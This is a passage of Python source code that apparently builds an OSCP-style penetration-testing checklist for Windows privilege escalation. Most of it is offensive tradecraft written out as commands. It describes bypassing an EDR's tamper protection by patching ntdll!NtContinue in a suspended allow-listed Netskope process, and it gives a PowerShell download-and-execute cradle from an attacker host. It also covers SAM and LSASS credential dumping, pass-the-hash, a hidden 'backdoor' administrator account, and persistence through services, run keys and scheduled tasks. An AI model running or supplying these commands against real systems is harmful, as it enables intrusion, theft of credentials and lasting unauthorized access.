                    'DLL injection blocked by tamper protection',
                    'CreateRemoteThread fails with access denied',
                    'Process handle rights stripped by driver',
                    'IPC still rejects commands'
                ],
                'next_steps': [
                    'Identify allow-listed binaries in Program Files',
                    'Choose injection method: DLL injection or suspended process',
                    'For tamper protection: Use suspended process + NtContinue patch',
                    'Proxy IPC commands from inside allow-listed process',
                    'Send privileged IPC commands to SYSTEM service'
                ],
                'alternatives': [
                    'DLL injection: CreateRemoteThread + LoadLibrary',
                    'Process hollowing: Start suspended + overwrite memory',
                    'NtContinue patch: Overwrite ntdll!NtContinue with LoadLibraryW call',
                    'APC injection: QueueUserAPC to suspended thread'
                ],
                'notes': '''
Tamper Protection Bypass: Suspended Process + NtContinue Patch

When minifilter/OB callbacks strip handle rights, traditional injection fails.
Solution: Create allow-listed process suspended, patch before driver protects it.

Driver-imposed restrictions:
- Process: No PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ
- Thread: Only THREAD_GET_CONTEXT, THREAD_RESUME, SYNCHRONIZE

Bypass technique:
1. CreateProcess(allow-listed.exe, CREATE_SUSPENDED)
2. Get handles: PROCESS_VM_WRITE | PROCESS_VM_OPERATION (allowed before protection)
3. Overwrite ntdll!NtContinue with stub:
   mov rax, LoadLibraryW
   mov rcx, "path_to_dll"
   jmp rax
4. ResumeThread() - triggers LoadLibraryW in-process
5. DLL loads, proxy IPC from inside allow-listed process

Example allow-listed binaries:
- stagentui.exe (Netskope UI)
- nsdiag.exe (Netskope diagnostics)
- bwansvc.exe (Backup agent)
- epdlp.exe (Endpoint DLP)

C Code template (simplified):
STARTUPINFO si = {sizeof(si)};
PROCESS_INFORMATION pi;
CreateProcessA("C:\\\\Program Files\\\\Vendor\\\\allowed.exe", NULL,
               NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Patch ntdll!NtContinue
LPVOID ntContinue = GetProcAddress(GetModuleHandleA("ntdll"), "NtContinue");
SIZE_T written;
BYTE shellcode[] = {0x48, 0xB8, ...}; // LoadLibraryW call
WriteProcessMemory(pi.hProcess, ntContinue, shellcode, sizeof(shellcode), &written);

ResumeThread(pi.hThread);
''',
                'estimated_time': '1-2 hours (including injection development)'
            }
        })

        tasks['children'].append(ipc_exploit_tasks)

        # === PHASE 4: AUTOMATED TOOLS ===
        automated_tools = {
            'id': f'automated-privesc-tools-{port}',
            'name': 'Automated Privilege Escalation Tools',
            'type': 'parent',
            'children': []
        }

        # Task 4.1: Winpeas
        automated_tools['children'].append({
            'id': f'winpeas-privesc-{port}',
            'name': 'Winpeas (Privilege Escalation Scanner)',
            'type': 'command',
            'metadata': {
                'command': 'winPEASx64.exe quiet cmd fast',
                'description': 'Automated Windows privilege escalation enumeration tool',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM', 'WINDOWS'],
                'flag_explanations': {
                    'quiet': 'Reduce output verbosity',
                    'cmd': 'Disable ANSI colors for better cmd.exe compatibility',
                    'fast': 'Skip time-consuming checks',
                    'searchfast': 'Fast file search (alternative)',
                    'searchall': 'Exhaustive file search (slow)'
                },
                'success_indicators': [
                    'Writable System PATH directories found',
                    'Missing DLL opportunities identified',
                    'SeImpersonatePrivilege detected',
                    'Unquoted service paths discovered',
                    'Weak service permissions found'
                ],
                'failure_indicators': [
                    'No privilege escalation vectors identified',
                    'Access denied errors',
                    'Antivirus blocks execution'
                ],
                'next_steps': [
                    'Review writable PATH directories output',
                    'Check AlwaysInstallElevated registry keys',
                    'Test unquoted service paths',
                    'Verify SeImpersonatePrivilege findings',
                    'Manual validation of discovered vectors'
                ],
                'alternatives': [
                    'PowerUp: powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/PowerUp.ps1\'); Invoke-AllChecks"',
                    'Seatbelt: Seatbelt.exe -group=all',
                    'SharpUp: SharpUp.exe',
                    'accesschk.exe: Manual permission checks'
                ],
                'notes': '''
Winpeas performs comprehensive Windows privilege escalation enumeration:
- Writable System PATH directories (DLL hijacking)
- Service misconfigurations
- Scheduled tasks with weak permissions
- Registry autoruns
- Token privileges (SeImpersonate, SeDebug, etc.)
- Stored credentials
- AlwaysInstallElevated MSI exploitation
- Unquoted service paths

Download: https://github.com/carlospolop/PEASS-ng/releases

Usage patterns:
- winPEASx64.exe > output.txt (save full output)
- winPEASx64.exe quiet cmd fast (quick scan)
- winPEASx64.exe systeminfo userinfo (specific categories)

Defenders may flag Winpeas - use manual enumeration for stealth
''',
                'estimated_time': '5-10 minutes'
            }
        })

        # Task 4.2: PowerUp
        automated_tools['children'].append({
            'id': f'powerup-privesc-{port}',
            'name': 'PowerUp (PowerSploit Module)',
            'type': 'command',
            'metadata': {
                'command': 'powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/PowerUp.ps1\'); Invoke-AllChecks"',
                'description': 'PowerShell-based privilege escalation enumeration (PowerSploit)',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM', 'WINDOWS', 'POWERSHELL'],
                'flag_explanations': {
                    '-ep bypass': 'Bypass PowerShell execution policy',
                    'IEX': 'Invoke-Expression - execute downloaded script',
                    'New-Object Net.WebClient': 'Create web client for file download',
                    'Invoke-AllChecks': 'Run all PowerUp enumeration checks',
                    'Find-ProcessDLLHijack': 'Specific DLL hijacking check',
                    'Find-PathDLLHijack': 'Check PATH for DLL hijacking opportunities'
                },
                'success_indicators': [
                    'Privilege escalation vectors identified',
                    'Service abuse opportunities found',
                    'DLL hijacking paths discovered',
                    'Modifiable scheduled tasks detected'
                ],
                'failure_indicators': [
                    'PowerShell execution blocked by AppLocker/WDAC',
                    'Script execution policy prevents download',
                    'Antivirus blocks PowerUp.ps1',
                    'No privilege escalation vectors found'
                ],
                'next_steps': [
                    'Review Invoke-AllChecks output',
                    'Run specific checks: Find-ProcessDLLHijack',
                    'Run Find-PathDLLHijack for PATH DLL opportunities',
                    'Test discovered service misconfigurations',
                    'Exploit unquoted service paths or weak permissions'
                ],
                'alternatives': [
                    'Local execution: Import-Module .\\PowerUp.ps1; Invoke-AllChecks',
                    'DLL hijacking: Find-ProcessDLLHijack; Find-PathDLLHijack',
                    'Write hijack DLL: Write-HijackDll -DllPath C:\\Path\\malicious.dll -Command "cmd.exe"',
                    'Service abuse: Get-ModifiableServiceFile; Invoke-ServiceAbuse',
                    'Winpeas: Alternative if PowerShell blocked'
                ],
                'notes': '''
PowerUp is part of PowerSploit framework.
Focuses on Windows privilege escalation enumeration.

Key functions:
- Invoke-AllChecks: Run all checks
- Find-ProcessDLLHijack: Process-specific DLL hijacking
- Find-PathDLLHijack: PATH directory DLL hijacking
- Write-HijackDll: Generate malicious DLL
- Get-ModifiableServiceFile: Writable service binaries
- Invoke-ServiceAbuse: Exploit service misconfigurations

Download: https://github.com/PowerShellMafia/PowerSploit
Direct: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

Evasion: PowerShell may be monitored - consider C#/compiled alternatives
''',
                'estimated_time': '5-10 minutes'
            }
        })

        tasks['children'].append(automated_tools)

        # === PHASE 5: EXPLOITATION VALIDATION ===
        validation_tasks = {
            'id': f'exploit-validation-{port}',
            'name': 'Post-Exploitation Validation',
            'type': 'parent',
            'children': []
        }

        # Task 5.1: Verify SYSTEM Access
        validation_tasks['children'].append({
            'id': f'verify-system-{port}',
            'name': 'Verify SYSTEM Privileges',
            'type': 'command',
            'metadata': {
                'command': 'whoami && whoami /priv && whoami /groups',
                'description': 'Confirm successful privilege escalation to NT AUTHORITY\\SYSTEM',
                'tags': ['OSCP:HIGH', 'VALIDATION', 'WINDOWS'],
                'flag_explanations': {
                    'whoami': 'Display current username',
                    'whoami /priv': 'Display current user privileges',
                    'whoami /groups': 'Display current user group memberships',
                    'NT AUTHORITY\\SYSTEM': 'Highest privilege level on Windows'
                },
                'success_indicators': [
                    'whoami output: nt authority\\system',
                    'All privileges enabled (SeDebugPrivilege, SeImpersonatePrivilege, etc.)',
                    'Mandatory Label: System Mandatory Level'
                ],
                'failure_indicators': [
                    'Still running as original user',
                    'Medium Integrity Level (not High or System)',
                    'Limited privileges'
                ],
                'next_steps': [
                    'Dump SAM database: reg save HKLM\\SAM sam.hive',
                    'Read protected files: type C:\\Windows\\System32\\config\\SAM',
                    'Create persistent admin account',
                    'Dump LSASS: procdump -ma lsass.exe lsass.dmp',
                    'Access administrator files'
                ],
                'alternatives': [
                    'PowerShell: [Security.Principal.WindowsIdentity]::GetCurrent()',
                    'Check token: whoami /all',
                    'Test SYSTEM access: dir C:\\Windows\\System32\\config',
                    'Test registry: reg query HKLM\\SAM\\SAM'
                ],
                'notes': '''
Confirm SYSTEM-level access:
1. Username: NT AUTHORITY\\SYSTEM
2. Integrity Level: System Mandatory Level
3. Privileges: All enabled (especially SeDebugPrivilege)

Privilege levels (lowest to highest):
- Low Integrity (sandboxed processes)
- Medium Integrity (standard users)
- High Integrity (administrators with UAC)
- System Integrity (NT AUTHORITY\\SYSTEM)

SYSTEM can:
- Read/write any file (including SAM, SYSTEM registry)
- Access LSASS memory
- Install kernel drivers
- Modify any process
- Bypass most security restrictions
''',
                'estimated_time': '10 seconds'
            }
        })

        # Task 5.2: Dump Credentials
        validation_tasks['children'].append({
            'id': f'dump-credentials-{port}',
            'name': 'Dump Credentials (SAM + SYSTEM)',
            'type': 'command',
            'metadata': {
                'command': 'reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive',
                'description': 'Dump SAM and SYSTEM registry hives for offline password cracking',
                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'WINDOWS', 'CREDENTIALS'],
                'flag_explanations': {
                    'reg save': 'Export registry hive to file',
                    'HKLM\\SAM': 'Security Account Manager - stores local user password hashes',
                    'HKLM\\SYSTEM': 'Contains encryption keys for SAM database',
                    '.hive': 'Registry hive file extension'
                },
                'success_indicators': [
                    'sam.hive created successfully',
                    'system.hive created successfully',
                    'Files contain registry data (non-zero size)',
                    'Able to extract hashes offline'
                ],
                'failure_indicators': [
                    'Access denied (not SYSTEM privileges)',
                    'Files empty or corrupt',
                    'Registry hives locked by another process'
                ],
                'next_steps': [
                    'Transfer files to attacker machine',
                    'Extract hashes: secretsdump.py -sam sam.hive -system system.hive LOCAL',
                    'Crack hashes: hashcat -m 1000 hashes.txt wordlist.txt',
                    'Crack hashes: john --format=NT hashes.txt',
                    'Use hashes for pass-the-hash attacks'
                ],
                'alternatives': [
                    'mimikatz: lsadump::sam',
                    'secretsdump.py: secretsdump.py Administrator@<TARGET>',
                    'Dump LSASS: procdump -ma lsass.exe lsass.dmp',
                    'Parse LSASS: pypykatz lsa minidump lsass.dmp',
                    'Volume Shadow Copy: vssadmin create shadow /for=C:',
                    'Copy from VSS: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM sam.hive'
                ],
                'notes': '''
SAM Database Dumping:

Method 1: Registry (requires SYSTEM):
reg save HKLM\\SAM sam.hive
reg save HKLM\\SYSTEM system.hive
reg save HKLM\\SECURITY security.hive

Method 2: Volume Shadow Copy (no SYSTEM required):
vssadmin create shadow /for=C:
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM sam.hive

Extract hashes offline:
secretsdump.py -sam sam.hive -system system.hive LOCAL
Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Hash format: username:RID:LM_hash:NTLM_hash

Crack with hashcat:
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

Pass-the-hash (no cracking):
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //<TARGET> cmd
''',
                'estimated_time': '2-3 minutes'
            }
        })

        # Task 5.3: Establish Persistence
        validation_tasks['children'].append({
            'id': f'establish-persistence-{port}',
            'name': 'Establish Persistence (Admin User)',
            'type': 'command',
            'metadata': {
                'command': 'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
                'description': 'Create persistent administrator account for continued access',
                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'WINDOWS', 'PERSISTENCE'],
                'flag_explanations': {
                    'net user backdoor P@ssw0rd123 /add': 'Create new local user account',
                    'net localgroup administrators backdoor /add': 'Add user to local administrators group',
                    '/add': 'Add operation (create user or add to group)'
                },
                'success_indicators': [
                    'The command completed successfully',
                    'User created: net user backdoor',
                    'User in administrators group: net localgroup administrators'
                ],
                'failure_indicators': [
                    'Access denied (insufficient privileges)',
                    'User already exists',
                    'Password does not meet complexity requirements'
                ],
                'next_steps': [
                    'Verify account: net user backdoor',
                    'Test RDP access: xfreerdp /u:backdoor /p:P@ssw0rd123 /v:<TARGET>',
                    'Test SMB access: smbclient -U backdoor //<TARGET>/C$',
                    'Hide account from login screen (see notes)',
                    'Document credentials for report'
                ],
                'alternatives': [
                    'Service persistence: sc create backdoor binpath= "cmd.exe /c backdoor.exe" start= auto',
                    'Scheduled task: schtasks /create /tn backdoor /tr "C:\\backdoor.exe" /sc onstart /ru SYSTEM',
                    'Registry run key: reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"',
                    'Startup folder: copy backdoor.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
                ],
                'notes': '''
Persistent Administrator Account:

Create and hide:
net user backdoor P@ssw0rd123 /add
net localgroup administrators backdoor /add
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v backdoor /t REG_DWORD /d 0

This hides account from Windows login screen but remains accessible.

Test access:
- RDP: xfreerdp /u:backdoor /p:P@ssw0rd123 /v:<TARGET>
- WinRM: evil-winrm -i <TARGET> -u backdoor -p P@ssw0rd123
- SMB: smbclient -U backdoor //<TARGET>/C$

OPSEC Warning:
- Account creation logged in Event ID 4720
- Administrator group modification logged in Event ID 4732
- Use sparingly and document for report
- Consider stealth alternatives: scheduled tasks, services

Password complexity:
Windows may require:
- Minimum 8 characters
- Uppercase + lowercase + numbers + symbols
- Use: P@ssw0rd123! if complexity enforced
''',
                'estimated_time': '1-2 minutes'
            }
        })

        tasks['children'].append(validation_tasks)

        return tasks
